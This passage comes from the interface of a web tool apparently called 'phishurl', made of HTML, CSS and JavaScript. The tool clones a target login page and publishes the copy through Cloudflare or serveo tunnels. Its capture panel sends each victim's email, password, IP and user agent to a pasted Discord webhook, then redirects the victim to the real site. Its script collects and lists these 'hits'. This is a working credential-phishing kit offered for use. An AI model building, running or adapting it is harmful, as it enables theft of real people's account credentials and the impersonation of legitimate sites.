  box-shadow:0 40px 90px -40px #000,inset 0 1px 0 rgba(255,255,255,.08);
  animation:slidein .42s var(--rise) both}
@keyframes slidein{from{opacity:0;transform:translateX(28px) scale(.985)}}
@keyframes fade{from{opacity:0}}
.sheet-head{display:flex;align-items:center;justify-content:space-between;gap:10px}
.sheet-head .kicker{margin-bottom:0;flex:1}
.x{width:30px;height:30px;border-radius:9px;border:1px solid var(--line);background:var(--glass);
  color:var(--mute);font-size:17px;line-height:1;cursor:pointer;transition:.2s}
.x:hover{background:var(--glass2);color:var(--ink)}
.sheet-lead{margin:14px 0 16px;font-size:11.5px;line-height:1.65;color:var(--faint)}
.sheet-lead b{color:#ffd79a;font-weight:500}
.sheet label{margin:0 0 11px}
.opt{position:absolute;right:0;top:0;font-family:var(--mono);font-size:8px;letter-spacing:.16em;
  color:var(--dim)}
.sheet-foot{display:flex;flex-direction:column;gap:8px;margin:16px 0 0}
.sheet-foot > div:last-child{display:flex;gap:7px;justify-content:flex-end}
.sheet-link{display:inline-block;margin:12px 0 0;font-family:var(--mono);font-size:9.5px;
  letter-spacing:.06em;color:var(--a2);text-decoration:none;border-bottom:1px solid rgba(var(--a2-rgb),.35)}
.sheet-link:hover{border-color:var(--a2)}

/* ── the look ─────────────────────────────────────────────────────────── */
.swatches{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px;margin:0 0 14px}
.swatches button{position:relative;display:flex;align-items:center;gap:8px;height:38px;
  padding:0 10px;border-radius:11px;border:1px solid var(--line);background:var(--glass);
  color:var(--faint);font-family:var(--mono);font-size:9px;letter-spacing:.1em;
  text-transform:uppercase;cursor:pointer;transition:.25s var(--rise);overflow:hidden}
.swatches button i{width:14px;height:14px;border-radius:5px;flex:0 0 auto;
  background:linear-gradient(135deg,var(--s1),var(--s2));box-shadow:0 0 14px -3px var(--s1)}
.swatches button:hover{color:var(--mute);border-color:var(--line2);transform:translateY(-1px)}
.swatches button.on{color:var(--ink);border-color:rgba(var(--a2-rgb),.45);
  background:rgba(var(--a2-rgb),.1);box-shadow:0 0 26px -14px rgba(var(--a2-rgb),.95)}
.tone-row{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px;margin:0 0 12px}
.tone{display:flex;align-items:center;gap:9px;padding:8px 11px;border-radius:12px;
  border:1px solid var(--line);background:rgba(255,255,255,.03);
  font-family:var(--mono);font-size:8.5px;letter-spacing:.16em;text-transform:uppercase;
  color:var(--faint)}
.tone input[type=color]{-webkit-appearance:none;appearance:none;width:30px;height:30px;
  padding:0;border:1px solid var(--line2);border-radius:9px;background:transparent;cursor:pointer}
.tone input[type=color]::-webkit-color-swatch-wrapper{padding:2px}
.tone input[type=color]::-webkit-color-swatch{border:0;border-radius:6px}
.tone b{margin-left:auto;font-family:var(--mono);font-size:9.5px;font-weight:400;
  letter-spacing:.04em;color:var(--mute);text-transform:none}
.wall-drop{display:flex;align-items:center;gap:11px;padding:12px;margin:0 0 12px;
  border-radius:12px;border:1px dashed rgba(255,255,255,.16);
  background:rgba(255,255,255,.025);cursor:pointer;transition:.25s var(--rise)}
.wall-drop:hover,.wall-drop.over{border-color:rgba(var(--a2-rgb),.55);
  background:rgba(var(--a2-rgb),.07)}
.wall-ico{position:relative;width:34px;height:34px;border-radius:10px;flex:0 0 auto;
  background:linear-gradient(140deg,rgba(var(--a1-rgb),.55),rgba(var(--a2-rgb),.45));
  box-shadow:inset 0 1px 0 rgba(255,255,255,.25)}
.wall-ico::after{content:"";position:absolute;inset:8px 7px;border-radius:4px;
  border:1.5px solid rgba(255,255,255,.85);border-top-color:transparent}
.wall-copy{display:flex;flex-direction:column;gap:2px;min-width:0;flex:1}
.wall-copy b{font-family:var(--mono);font-size:8.5px;letter-spacing:.18em;
  text-transform:uppercase;color:var(--a2);font-weight:500}
.wall-copy span{font-size:11px;color:var(--faint);overflow:hidden;text-overflow:ellipsis;
  white-space:nowrap}
label.dim{margin:0 0 4px}
label.dim input[type=range]{-webkit-appearance:none;appearance:none;display:block;width:100%;
  height:6px;margin-top:10px;border-radius:999px;background:rgba(255,255,255,.09);outline:none}
label.dim input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;
  border-radius:50%;background:linear-gradient(135deg,var(--a1),var(--a2));cursor:pointer;
  box-shadow:0 0 14px -2px var(--a2)}

/* ── motion entry ─────────────────────────────────────────────────────── */
/* the cards rise on load and never wait for a scroll listener: a reveal tied
   to an intersection observer leaves content invisible in a screenshot, in a
   long page, and in any browser that throttles observers in a background tab. */
.rv{animation:rise .9s var(--rise) both;animation-delay:var(--d,0s)}
@keyframes rise{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}
.hidden{display:none !important}

/* ── responsive ───────────────────────────────────────────────────────── */
@media (max-width:1240px){
  .gates{grid-template-columns:repeat(3,minmax(0,1fr))}
}
@media (max-width:1080px){
  .grid{grid-template-columns:1fr}
  .rail > .card{position:static}
  .notes{grid-template-columns:1fr}
  .frame-wrap{height:min(420px,46vh)}
}
@media (max-width:760px){
  .app{padding:14px 14px 34px}
  header.top{flex-wrap:wrap;gap:10px;padding-bottom:14px}
  .top-right{margin-left:auto}
  .card{padding:16px;border-radius:var(--r3)}
  h1.hl{font-size:clamp(24px,7.2vw,30px)}
  .adv{grid-template-columns:1fr}
  .idle-grid{grid-template-columns:1fr}
  .idle-foot div{grid-template-columns:minmax(0,1fr);gap:2px}
  .panels{grid-template-columns:1fr}
  #discovery,.log{height:210px}
  .gates{grid-template-columns:repeat(2,minmax(0,1fr))}
  .phases{flex-wrap:wrap}
  .ph{flex:1 1 30%}
  .dock{flex-wrap:wrap}
  .primary{width:100%}
  .frame-wrap{height:min(470px,56vh)}
  .hit{grid-template-columns:54px minmax(0,1fr)}
  .hit .key{grid-column:1/-1;justify-self:start}
  .stats{grid-template-columns:repeat(2,minmax(0,1fr))}
  #settings{padding:0}
  .sheet{width:100%;height:100%;max-height:none;border-radius:0;border:0}
  .counters{gap:12px}
}
@media (max-width:430px){
  .brand .tag{display:none}
  .chip{font-size:8px;padding:0 9px;letter-spacing:.1em}
  .counters b{font-size:14px}
}
@media (prefers-reduced-motion:reduce){
  *,*::before,*::after{animation:none !important;transition:none !important}
  .rv{opacity:1;transform:none;animation:none !important}
}
</style>
</head>
<body>
<div class="wall" id="wall" aria-hidden="true"></div>
<div class="aurora"><i></i><i></i><i></i><i></i></div>

<div class="app">

  <header class="top">
    <a class="brand" href="/" onclick="return false">
      <span class="mark"></span>
      <span class="bt">
        <span class="word">phishurl</span>
        <span class="tag">exact mirror · public link</span>
      </span>
    </a>
    <div class="top-right">
      <a class="chip cap" id="hits-chip" href="#hits" hidden><i></i><span>0 captures</span></a>
      <div class="chip" id="tunnel-chip"><i></i><span>tunnel</span></div>
      <button class="ghost" id="open-settings">theme</button>
    </div>
  </header>

  <div class="grid">

    <aside class="rail">
      <section class="card hero edge rv">
        <div class="kicker"><b>01</b> target</div>
        <h1 class="hl">point it at a page.<br><span class="grad">take the copy.</span></h1>
        <p class="sub">chromium renders it, every byte kept, every link rewritten in place.</p>

        <div class="dock">
          <div class="input-wrap">
            <span class="scheme">https://</span>
            <input id="url" type="text" spellcheck="false" autocomplete="off"
                   placeholder="example.com/login">
          </div>
          <button class="primary" id="go">clone</button>
        </div>

        <div class="opts">
          <label class="pill on accent" id="pill-tunnel"><input type="checkbox" id="opt-tunnel" checked>
            <span class="nub"></span>cloudflare tunnel</label>
          <label class="pill on" id="pill-render"><input type="checkbox" id="opt-render" checked>
            <span class="nub"></span>render</label>
          <label class="pill on" id="pill-sanitize"><input type="checkbox" id="opt-sanitize" checked>
            <span class="nub"></span>sanitize</label>
          <label class="pill" id="pill-deploy"><input type="checkbox" id="opt-deploy">
            <span class="nub"></span>pages</label>
          <button class="adv-toggle" id="adv-toggle">advanced</button>
        </div>

        <div class="adv hidden" id="adv">
          <label>project
            <input id="opt-project" type="text" spellcheck="false" placeholder="from host"></label>
          <label>proxy
            <input id="opt-proxy" type="text" spellcheck="false" placeholder="host:port"></label>
          <label>assets
            <input id="opt-max" type="number" min="1" max="20000" value="5000"></label>
          <label>depth
            <select id="opt-depth">
              <option value="1">1 — page</option>
              <option value="2">2 — one hop</option>
            </select></label>
        </div>

        <div class="capture" id="capture-box">
          <div class="cap-head">
            <span>capture · webhook</span>
            <span class="mini" id="cap-state">off</span>
          </div>
          <div class="cap-grid">
            <label>webhook
              <input id="opt-webhook" type="text" spellcheck="false" autocomplete="off"
                     placeholder="https://discord.com/api/webhooks/…"></label>
            <label>bounce
              <input id="opt-redirect" type="text" spellcheck="false" autocomplete="off"
                     placeholder="https://discord.com/login"></label>
          </div>
          <p class="cap-note" id="cap-note">paste a webhook and every submit lands there —
            address, password, ip, agent — then the visitor leaves for <b>bounce</b>.</p>
        </div>

        <div class="stats">
          <div class="stat"><b id="stat-assets">5 000</b><span id="stat-parallel">assets · 8 parallel</span></div>
          <div class="stat"><b>6 × 6</b><span>gates · heals</span></div>
          <div class="stat"><b>45 s</b><span>render cap</span></div>
          <div class="stat"><b>3-way</b><span>tunnel race</span></div>
        </div>
      </section>
    </aside>

    <main class="stage">

      <section class="card idle rv" id="stage-idle" style="--d:.08s">
        <div class="kicker"><b>02</b> run</div>
        <h2 class="idle-h">nothing running yet</h2>
        <p class="idle-p">paste a target and press clone. the console fills in here.</p>
        <div class="idle-grid">
          <div><b>render</b><span>chromium to network idle</span></div>
          <div><b>crawl</b><span>the page, or one hop</span></div>
          <div><b>download</b><span>8 at once, deduped</span></div>
          <div><b>rewrite</b><span>attributes only, byte order kept</span></div>
          <div><b>heal</b><span>six gates, six passes</span></div>
          <div><b>publish</b><span>cloudflare tunnel first</span></div>
        </div>
        <div class="core" aria-hidden="true"><i></i><i></i><span></span></div>
        <div class="idle-foot">
          <div><b>target</b><code>as pasted · http on loopback, https elsewhere</code></div>
          <div><b>artifacts</b><code>phishurl_out/&lt;job&gt;/ · mirror · manifest · zip</code></div>
          <div><b>captures</b><code>&lt;job&gt;-hits.jsonl beside the mirror</code></div>
        </div>
      </section>

      <section class="card console hidden" id="console">
        <div class="console-head">
          <div class="kicker"><b>02</b> run
            <span class="live"><span class="mini">job</span><code id="job-id">—</code></span>
          </div>
          <div class="counters">
            <div><b id="c-pages">0</b><span>pages</span></div>
            <div><b id="c-assets">0</b><span>assets</span></div>
            <div><b id="c-bytes">0 B</b><span>bytes</span></div>
            <div><b id="c-fails">0</b><span>fails</span></div>
          </div>
        </div>
        <div class="phases" id="phases">
          <span class="ph" data-phase="render">render</span>
          <span class="ph" data-phase="crawl">crawl</span>
          <span class="ph" data-phase="download">download</span>
          <span class="ph" data-phase="rewrite">rewrite</span>
          <span class="ph" data-phase="heal">heal</span>
          <span class="ph" data-phase="package">package</span>
          <span class="ph" data-phase="deploy">pages</span>
          <span class="ph" data-phase="publish">publish</span>
        </div>
        <div class="track"><i id="bar"></i></div>
        <div class="panels">
          <div class="panel">
            <div class="panel-head"><span>discovery</span>
              <span class="mini" id="d-count">0 urls</span></div>
            <ul id="discovery"></ul>
          </div>
          <div class="panel">
            <div class="panel-head"><span>log</span>
              <input id="log-filter" type="text" spellcheck="false" placeholder="filter"></div>
            <div class="log" id="log"></div>
          </div>
        </div>
      </section>

      <section class="card hidden" id="heal">
        <div class="console-head">
          <div class="kicker"><b>03</b> gates</div>
          <span class="mini" id="heal-score">score —</span>
        </div>
        <div class="gates">
          <div class="gate measuring" data-gate="render">
            <span class="name">render</span><b class="val">—</b>
            <div class="bar-mini"><i></i></div></div>
          <div class="gate measuring" data-gate="assets">
            <span class="name">assets</span><b class="val">—</b>
            <div class="bar-mini"><i></i></div></div>
          <div class="gate measuring" data-gate="style">
            <span class="name">style</span><b class="val">—</b>
            <div class="bar-mini"><i></i></div></div>
          <div class="gate measuring" data-gate="js">
            <span class="name">js</span><b class="val">—</b>
            <div class="bar-mini"><i></i></div></div>
          <div class="gate measuring" data-gate="nav">
            <span class="name">nav</span><b class="val">—</b>
            <div class="bar-mini"><i></i></div></div>
          <div class="gate measuring" data-gate="form">
            <span class="name">form</span><b class="val">—</b>
            <div class="bar-mini"><i></i></div></div>
        </div>
        <div class="timeline" id="timeline">
          <div class="tl-empty">waiting for the first gate pass</div>
        </div>
      </section>

      <section class="card edge hidden" id="result">
        <div class="result-main">
          <div class="kicker"><b>04</b> ship</div>
          <div><span class="badge" id="result-badge">built</span></div>
          <h3 id="result-title">the mirror is on disk</h3>
          <p id="result-note" class="mini"></p>
          <div class="publish" id="publish-box">
            <div class="publish-head">
              <span>public link</span>
              <span class="mini" id="pub-state">closed</span>
            </div>
            <a class="pub-out" id="pub-link" target="_blank" rel="noopener"><code id="pub-url">no link yet</code></a>
            <div class="publish-row">
              <button class="primary sm" id="pub">open a public link</button>
              <button class="ghost warm" id="pub-copy" disabled>copy</button>
              <button class="ghost hidden" id="pub-stop">stop</button>
            </div>
            <p class="mini" id="pub-note">cloudflare tunnel first · the first address that answers wins</p>
          </div>
          <div class="urlrow local">
            <span class="tag">local</span>
            <code id="result-url">—</code>
            <button class="ghost warm" id="copy">copy</button>
            <a class="ghost warm" id="open" target="_blank" rel="noopener">open</a>
          </div>
          <div class="actions">
            <a class="ghost" id="dl">download zip</a>
            <span class="mini" id="mirror-path"></span>
          </div>
        </div>
        <div class="preview">
          <div class="vp-switch" id="vp">
            <button data-w="1440" class="on">desktop</button>
            <button data-w="820">tablet</button>
            <button data-w="420">mobile</button>
          </div>
          <div class="frame-wrap" id="frame-wrap">
            <div class="device" id="device">
              <iframe id="frame" title="mirror preview"
                      sandbox="allow-scripts allow-forms allow-popups"></iframe>
            </div>
          </div>
        </div>
      </section>

      <section class="card hidden" id="hits">
        <div class="hits-head">
          <div class="kicker"><b>05</b> captures</div>
          <div class="hits-tools">
            <span id="hit-count">0 hits</span>
            <button class="ghost warm" id="hits-copy">copy all</button>
          </div>
        </div>
        <div class="hits" id="hits-list">
          <div class="hit-empty">nothing captured yet — open the mirror, type into the form</div>
        </div>
      </section>

      <div class="notes">
        <div><b>exact bytes</b><span>every response kept as received, reused before the network</span></div>
        <div><b>in place</b><span>attributes only — markup order and scripts untouched</span></div>
        <div><b>one press</b><span>the tunnel opens when the run ends, address on the card</span></div>
      </div>

    </main>
  </div>

  <footer>
    <span class="credit">© <span id="year">2026</span> <b>AnonymousGroup</b> · all rights reserved</span>
    <span class="sig">phishurl <span id="ver">1.0.0</span> · one file · no build step</span>
  </footer>

</div>

<div class="hidden" id="settings">
  <div class="sheet">
    <div class="sheet-head">
      <div class="kicker"><b>06</b> theme</div>
      <button class="x" id="close-settings" aria-label="close">×</button>
    </div>
    <p class="sheet-lead">a palette, two colours, or your own image behind the glass.</p>

    <div class="swatches" id="presets">
      <button data-preset="aurora" style="--s1:#7c5cff;--s2:#22d3ee"><i></i>aurora</button>
      <button data-preset="ember" style="--s1:#ff7a45;--s2:#ffc35a"><i></i>ember</button>
      <button data-preset="ice" style="--s1:#5b9cff;--s2:#8ef5ff"><i></i>ice</button>
      <button data-preset="toxic" style="--s1:#33ff9e;--s2:#8bffcf"><i></i>toxic</button>
      <button data-preset="sunset" style="--s1:#ff5f9e;--s2:#ffb36b"><i></i>sunset</button>
      <button data-preset="mono" style="--s1:#e9ecf5;--s2:#97a2bd"><i></i>mono</button>
    </div>

    <div class="tone-row">
      <label class="tone">accent<input id="t-accent" type="color" value="#7c5cff"><b id="t-accent-v">#7c5cff</b></label>
      <label class="tone">signal<input id="t-accent2" type="color" value="#22d3ee"><b id="t-accent2-v">#22d3ee</b></label>
    </div>

    <div class="wall-drop" id="wall-drop">
      <span class="wall-ico"></span>
      <span class="wall-copy">
        <b>background image</b>
        <span id="wall-name">drop a picture, or click to choose</span>
      </span>
      <button class="ghost" id="wall-clear" type="button">clear</button>
      <input id="wall-file" type="file" accept="image/*" hidden>
    </div>

    <label class="dim">wallpaper scrim <span class="opt" id="t-dim-v">36%</span>
      <input id="t-dim" type="range" min="0" max="90" step="2" value="36"></label>

    <div class="sheet-foot">
      <span class="mini" id="theme-out"></span>
      <div>
        <button class="ghost" id="theme-reset">reset</button>
        <button class="primary sm" id="save">save</button>
      </div>
    </div>
  </div>
</div>

<script>
const $ = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
const state = { job: null, es: null, assets: new Map(), rows: [], done: false, phase: '',
                hits: [], hitKeys: new Set() };

const PHASES = ['render', 'crawl', 'download', 'rewrite', 'heal', 'package', 'deploy', 'publish'];
let pubTimer = null;
// a live free tunnel dies on its own schedule; the address keeps its own slow
// heartbeat so a dead link is never left sitting on the card looking healthy
let pubWatch = null;

function esc(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function fmtBytes(size) {
  size = Number(size) || 0;
  if (size < 1024) return size + ' B';
  const units = ['KB', 'MB', 'GB'];
  let value = size / 1024, i = 0;
  while (value >= 1024 && i < units.length - 1) { value /= 1024; i++; }
  return value.toFixed(value >= 10 ? 0 : 1) + ' ' + units[i];
}

function clock() {
  return new Date().toTimeString().slice(0, 8);
}

/* one fetch helper: GET when there is no body and no verb, POST otherwise */
async function api(path, body, method) {
  const options = (body !== undefined || method) ? {
    method: method || 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: body === undefined ? '{}' : JSON.stringify(body)
  } : {};
  const response = await fetch(path, options);
  const text = await response.text();
  let data = {};
  try { data = text ? JSON.parse(text) : {}; } catch (err) { data = { raw: text }; }
  if (!response.ok) {
    throw new Error(data.detail || data.error || ('HTTP ' + response.status));
  }
  return data;
}

/* ── log ─────────────────────────────────────────────────────────────── */
function logLine(message, level) {
  const box = $('#log');
  const row = document.createElement('div');
  const tag = (level && level !== 'info') ? ' ' + level : '';
  row.className = tag.trim();
  row.dataset.raw = String(message || '').toLowerCase();
  row.innerHTML = '<span class="t">' + clock() + '</span>' + esc(message);
  const pinned = box.scrollHeight - box.scrollTop - box.clientHeight < 90;
  box.appendChild(row);
  state.rows.push(row);
  if (state.rows.length > 900) {
    const old = state.rows.shift();
    if (old && old.parentNode) old.parentNode.removeChild(old);
  }
  if (pinned || state.rows.length <= 2) box.scrollTop = box.scrollHeight;
}

function applyFilter() {
  const needle = $('#log-filter').value.trim().toLowerCase();
  state.rows.forEach((row) => {
    row.style.display = (!needle || row.dataset.raw.indexOf(needle) !== -1) ? '' : 'none';
  });
}

/* ── discovery ───────────────────────────────────────────────────────── */
function upsertAsset(event) {
  const url = event.url || '';
  if (!url) return;
  let row = state.assets.get(url);
  if (!row) {
    row = document.createElement('li');
    row.innerHTML = '<span class="sdot"></span><span class="u"></span><span class="sz"></span>';
    const list = $('#discovery');
    list.insertBefore(row, list.firstChild);
    state.assets.set(url, row);
    if (list.children.length > 420) list.removeChild(list.lastChild);
  }
  const dot = row.querySelector('.sdot');
  dot.className = 'sdot ' + (event.status || '');
  row.querySelector('.u').textContent = url.replace(/^https?:\/\//, '');
  row.querySelector('.u').title = url;
  const size = row.querySelector('.sz');
  if (event.status === 'done') size.textContent = fmtBytes(event.size);
  else if (event.status === 'failed') size.textContent = 'fail';
  else if (event.status === 'placeholder') size.textContent = 'stub';
  else size.textContent = event.status || '';
  $('#d-count').textContent = state.assets.size + ' urls';
}

/* ── counters ────────────────────────────────────────────────────────── */
function setCounters(counts) {
  if (!counts) return;
  if (counts.pages != null) $('#c-pages').textContent = counts.pages;
  if (counts.assets != null) $('#c-assets').textContent = counts.assets;
  if (counts.bytes != null) $('#c-bytes').textContent = fmtBytes(counts.bytes);
  if (counts.failed != null) $('#c-fails').textContent = counts.failed;
  const total = Number(counts.assets) || 0;
  const done = Number(counts.done != null ? counts.done : total);
  $('#bar').style.width = total ? Math.min(100, Math.round((done / total) * 100)) + '%' : '5%';
}

function setPhase(phase) {
  if (!phase) return;
  state.phase = phase;
  const index = PHASES.indexOf(phase);
  $$('#phases .ph').forEach((chip) => {
    const at = PHASES.indexOf(chip.dataset.phase);
    chip.className = 'ph';
    if (index > -1 && at < index) chip.classList.add('done');
    if (at === index) chip.classList.add('now');
  });
  if (phase === 'publish') $('#bar').style.width = '100%';
}

/* ── gates & heal timeline ───────────────────────────────────────────── */
function setGate(gate) {
  const card = $('[data-gate="' + gate.name + '"]');
  if (!card) return;
  card.classList.remove('measuring', 'pass', 'fail');
  card.classList.add(gate.passed ? 'pass' : 'fail');
  card.querySelector('.val').textContent = Math.round((gate.score || 0) * 100) + '%';
  card.querySelector('.bar-mini i').style.width = Math.round((gate.score || 0) * 100) + '%';
  const scores = $$('.gate .val').map((node) => {
    const value = parseFloat(node.textContent);
    return isNaN(value) ? null : value / 100;
  }).filter((value) => value !== null);
  if (scores.length) {
    const mean = scores.reduce((a, b) => a + b, 0) / scores.length;
    $('#heal-score').textContent = 'score ' + mean.toFixed(2) + ' · ' + scores.length + '/6 gates';
  }
}

function addHeal(event) {
  const timeline = $('#timeline');
  const empty = timeline.querySelector('.tl-empty');
  if (empty) empty.remove();
  const item = document.createElement('details');
  item.className = 'tl';
  item.innerHTML =
    '<summary><span class="it">#' + esc(event.iteration) + '</span>' +
    '<span class="g">' + esc(event.gate) + '</span>' +
    '<span class="ar">→</span><span>' + esc(event.diagnosis) + '</span></summary>' +
    '<div class="body"><dl>' +
    '<dt>diagnosis</dt><dd>' + esc(event.diagnosis) + '</dd>' +
    '<dt>action</dt><dd>' + esc(event.action) + '</dd>' +
    '<dt>outcome</dt><dd>' + esc(event.outcome) + '</dd>' +
    '</dl></div>';
  timeline.appendChild(item);
  if (timeline.children.length > 40) timeline.removeChild(timeline.firstChild);
}

/* ── publish: serveo.net, one click ──────────────────────────────────── */
const PUB_COPY = 'one press · a reverse forward opens and the public address comes back';

function resetPublish() {
  if (pubTimer) { clearInterval(pubTimer); pubTimer = null; }
  if (pubWatch) { clearInterval(pubWatch); pubWatch = null; }
  const out = $('#pub-url');
  out.textContent = 'no link yet';
  out.classList.remove('live');
  out.classList.remove('gone');
  $('#pub-link').removeAttribute('href');
  $('#pub-copy').disabled = true;
  $('#pub').disabled = false;
  $('#pub').textContent = 'open a public link';
  $('#pub-stop').classList.add('hidden');
  $('#publish-box').classList.remove('live');
  const chip = $('#pub-state');
  chip.textContent = 'closed';
  chip.className = 'mini';
  const note = $('#pub-note');
  note.className = 'mini';
  note.textContent = PUB_COPY;
}

function handlePublish(data) {
  const out = $('#pub-url'), button = $('#pub'), note = $('#pub-note');
  const box = $('#publish-box'), chip = $('#pub-state');
  const current = data || {};
  if (current.state === 'live' && current.url) {
    if (pubTimer) { clearInterval(pubTimer); pubTimer = null; }
    out.textContent = current.url;
    out.classList.remove('gone');
    out.classList.add('live');
    $('#pub-link').href = current.url;
    $('#pub-copy').disabled = false;
    $('#pub-stop').classList.remove('hidden');
    box.classList.add('up');
    button.disabled = false;
    button.textContent = 'new link';
    chip.textContent = current.provider || 'live';
    chip.className = 'mini ok';
    note.className = 'mini ok';
    note.textContent = 'forward 80 → 127.0.0.1:' + (current.port || '?') +
      ' · anyone with the link can open it';
    setPhase('publish');
    $('#result-badge').className = 'badge live';
    $('#result-badge').textContent = 'live';
    $('#result-title').textContent = 'the mirror is live';
    logLine('public · ' + current.url, 'ok');
    watchPublish();
    return;
  }
  if (current.state === 'dead') {
    // a dead sample between two providers is not the end of the chain
    const untried = (current.providers || []).filter(
      (name) => !(current.tried || []).includes(name));
    if (untried.length && pubTimer) {
      chip.textContent = 'retrying';
      chip.className = 'mini';
      note.className = 'mini';
      note.textContent = (current.error || 'that provider refused') +
        ' · trying ' + untried.join(', ');
      return;
    }
    if (pubTimer) { clearInterval(pubTimer); pubTimer = null; }
    out.textContent = 'no link yet';
    out.classList.remove('live');
    $('#pub-link').removeAttribute('href');
    $('#pub-copy').disabled = true;
    box.classList.remove('up');
    button.disabled = false;
    button.textContent = 'try again';
    $('#pub-stop').classList.add('hidden');
    chip.textContent = 'failed';
    chip.className = 'mini bad';
    note.className = 'mini bad';
    note.textContent = current.error || 'the tunnel did not come up';
    logLine('publish · ' + (current.error || 'tunnel failed'), 'error');
    return;
  }
  if (current.state === 'idle' || current.state === 'closed') {
    resetPublish();
    return;
  }
  button.disabled = true;
  button.textContent = 'opening…';
  chip.textContent = 'handshake';
  chip.className = 'mini';
  note.className = 'mini';
  note.textContent = (current.banner && current.banner.length)
    ? current.banner[current.banner.length - 1]
    : 'ssh -R through ' + (current.providers || ['serveo']).join(' → ');
}

function watchPublish() {
  if (pubWatch) return;
  pubWatch = setInterval(async () => {
    if (!state.job) return;
    try {
      const data = await api('/api/publish/' + state.job);
      if (data && data.state === 'dead') expirePublish(data);
      else if (data && data.state === 'live' && data.url) {
        // the session can come back on a new hostname; take the address it reports
        if (data.url !== $('#pub-url').textContent) {
          $('#pub-url').textContent = data.url;
          $('#pub-url').classList.add('live');
          $('#pub-link').href = data.url;
          logLine('public · address moved to ' + data.url, 'warn');
        }
      }
    } catch (error) { /* a missed beat is not a dead tunnel */ }
  }, 20000);
}

function expirePublish(data) {
  if (pubWatch) { clearInterval(pubWatch); pubWatch = null; }
  const button = $('#pub'), note = $('#pub-note'), chip = $('#pub-state');
  const out = $('#pub-url');
  out.classList.remove('live');
  out.classList.add('gone');
  out.textContent = 'link expired';
  $('#pub-link').removeAttribute('href');
  $('#pub-copy').disabled = true;
  $('#publish-box').classList.remove('up');
  $('#pub-stop').classList.add('hidden');
  button.disabled = false;
  button.textContent = 'reopen';
  chip.textContent = 'expired';
  chip.className = 'mini bad';
  note.className = 'mini bad';
  note.textContent = (data && data.error ? data.error + ' · ' : '') +
    'the provider dropped it · reopen races a fresh one';
  logLine('publish · the session dropped, that address is dead', 'warn');
}

function pollPublish() {
  if (pubTimer) return;
  pubTimer = setInterval(async () => {
    if (!state.job) return;
    try {
      handlePublish(await api('/api/publish/' + state.job));
    } catch (error) { /* the next tick tries again */ }
  }, 1500);
}

async function publish() {
  if (!state.job) { logLine('nothing to publish yet', 'warn'); return; }
  resetPublish();
  $('#pub').disabled = true;
  $('#pub').textContent = 'opening…';
  $('#pub-note').textContent = 'providers racing · the first address that answers wins';
  $('#publish-box').classList.remove('hidden');
  try {
    handlePublish(await api('/api/publish', { job_id: state.job }));
    pollPublish();
  } catch (error) {
    $('#pub').disabled = false;
    $('#pub').textContent = 'try again';
    const note = $('#pub-note');
    note.className = 'mini bad';
    note.textContent = error.message;
    logLine('publish · ' + error.message, 'error');
  }
}

async function stopPublish() {
  if (!state.job) return;
  if (pubTimer) { clearInterval(pubTimer); pubTimer = null; }
  try {
    await api('/api/publish/' + state.job, undefined, 'DELETE');
    logLine('public link closed', 'warn');
  } catch (error) {
    logLine('close · ' + error.message, 'warn');
  }
  resetPublish();
}

/* ── capture ─────────────────────────────────────────────────────────── */
const CAP_KEY = 'phishurl.capture';
const CAP_NOTE = 'paste a webhook and every submit lands there — address, password, ip, agent — ' +
  'then the visitor leaves for <b>bounce</b>. the webhook is the sink; nothing to host.';

function endpointOk(value) {
  return /^https?:\/\/[^\s]+$/i.test(value || '');
}

function hostOf(value) {
  try { return new URL(value).host || value; } catch (error) { return value; }
}

function captureValues() {
  const webhook = $('#opt-webhook').value.trim();
  const redirect = $('#opt-redirect').value.trim();
  return {
    webhook: endpointOk(webhook) ? webhook : '',
    redirect: endpointOk(redirect) ? redirect : '',
    badWebhook: !!webhook && !endpointOk(webhook),
    badRedirect: !!redirect && !endpointOk(redirect)
  };
}

function syncCapture() {
  const values = captureValues();
  const armed = !!values.webhook;
  $('#capture-box').classList.toggle('armed', armed);
  const chip = $('#cap-state');
  chip.className = 'mini' + (armed ? ' ok' : '');
  chip.textContent = values.badWebhook ? 'bad url' : (armed ? 'armed' : 'off');
  const note = $('#cap-note');
  if (values.badWebhook) {
    note.innerHTML = 'that is not an http(s) url — capture stays <b>off</b> until it is.';
  } else if (values.badRedirect) {
    note.innerHTML = 'bounce target is not an http(s) url — drop it and the form holds ' +
      'still instead of moving on.';
  } else if (armed) {
    note.innerHTML = 'armed · every submit posts name, address and password to <b>' +
      esc(hostOf(values.webhook)) + '</b>' +
      (values.redirect ? ', then the visitor is bounced to <b>' + esc(hostOf(values.redirect)) +
                         '</b>.' : ' and the form stays where it is.');
  } else {
    note.innerHTML = CAP_NOTE;
  }
}

function loadCapture() {
  let saved = {};
  try { saved = JSON.parse(localStorage.getItem(CAP_KEY) || '{}') || {}; } catch (error) { saved = {}; }
  $('#opt-webhook').value = saved.webhook || '';
  $('#opt-redirect').value = saved.redirect || '';
  syncCapture();
}

function storeCapture() {
  try {
    localStorage.setItem(CAP_KEY, JSON.stringify({
      webhook: $('#opt-webhook').value.trim(),
      redirect: $('#opt-redirect').value.trim()
    }));
  } catch (error) { /* private mode: the fields still carry this run */ }
  syncCapture();
}

/* ── hits ────────────────────────────────────────────────────────────── */
function hitStamp(hit) {
  const when = new Date(String((hit && hit.t) || ''));
  if (isNaN(when.getTime())) return clock();
  return when.toTimeString().slice(0, 8);
}

function hitLine(hit) {
  return [hitStamp(hit), (hit.email || '-'), (hit.password || '-'), (hit.ip || '-'),
          (hit.page || '')].join('  ');
}

function addHit(hit) {
  if (!hit || typeof hit !== 'object') return;
  const key = [hit.email, hit.password, hit.ip, hit.t].join('|');
  if (state.hitKeys.has(key)) return;
  state.hitKeys.add(key);
  state.hits.push(hit);

  const list = $('#hits-list');
  const empty = $('.hit-empty', list);
  if (empty) empty.remove();

  const row = document.createElement('div');
  row.className = 'hit';
  const when = document.createElement('div');
  when.className = 'when';
  when.textContent = hitStamp(hit);
  const who = document.createElement('div');
  who.className = 'who';
  const address = document.createElement('b');
  address.textContent = hit.email || '(no address)';
